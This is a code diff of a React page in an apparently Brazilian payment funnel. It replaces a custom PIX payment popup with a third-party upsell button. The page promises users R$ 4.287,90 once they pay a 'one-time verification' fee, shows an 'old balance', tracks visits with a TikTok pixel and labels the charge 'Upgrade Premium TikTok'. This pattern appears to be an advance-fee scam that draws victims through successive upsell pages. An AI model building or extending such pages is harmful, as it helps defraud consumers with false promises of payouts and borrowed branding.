@@ -1,9 +1,6 @@
-import { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import ParadisePixPopup from '@/components/ParadisePixPopup';
+import { useEffect } from 'react';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
-import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_ANTIGO = 2834.72;
@@ -20,18 +17,9 @@ const formatBR = (value: number) => {
 };
 
 const Up4 = () => {
-  const navigate = useNavigate();
-  const [showPixPopup, setShowPixPopup] = useState(false);
-  const { customer } = useCustomerData();
-
   useEffect(() => {
     trackViewContent('Upgrade Premium', TAXA_UPGRADE);
   }, []);
-
-  const handlePaymentSuccess = () => {
-    setShowPixPopup(false);
-    navigate('/up5');
-  };
 
   return (
     <PageTransition>
@@ -111,24 +99,30 @@ const Up4 = () => {
         {/* Fixed Bottom Button */}
         <div className="fixed-footer">
           <button
-            onClick={() => setShowPixPopup(true)}
-            className="cta-button cta-success"
+            className="paradise-upsell-btn"
+            style={{
+              backgroundColor: '#28a745',
+              color: '#ffffff',
+              padding: '12px 20px',
+              border: 'none',
+              borderRadius: '6px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: 'pointer',
+              width: '100%',
+            }}
+            data-offer-hash="upsell_cabf994f36e93447"
+            data-modal-title="Confirmar Upgrade!"
+            data-copy-button-text="Copiar Código PIX"
+            data-modal-bg="#ffffff"
+            data-modal-title-color="#1f2937"
+            data-modal-btn-color="#28a745"
+            data-modal-btn-text-color="#ffffff"
           >
-            Confirmar Upgrade e Receber R$ {formatBR(SALDO_NOVO)}
+            Confirmar Upgrade e receber R$ 4.287,90
           </button>
           <p className="cta-success-note">Verificação única de R$ {formatBR(TAXA_UPGRADE)}</p>
         </div>
-
-        {showPixPopup && (
-          <ParadisePixPopup
-            amount={TAXA_UPGRADE_CENTAVOS}
-            description="Upgrade Premium TikTok"
-            productHash={PRODUCT_HASH}
-            customer={customer}
-            onSuccess={handlePaymentSuccess}
-            onClose={() => setShowPixPopup(false)}
-          />
-        )}
       </main>
     </PageTransition>
   );
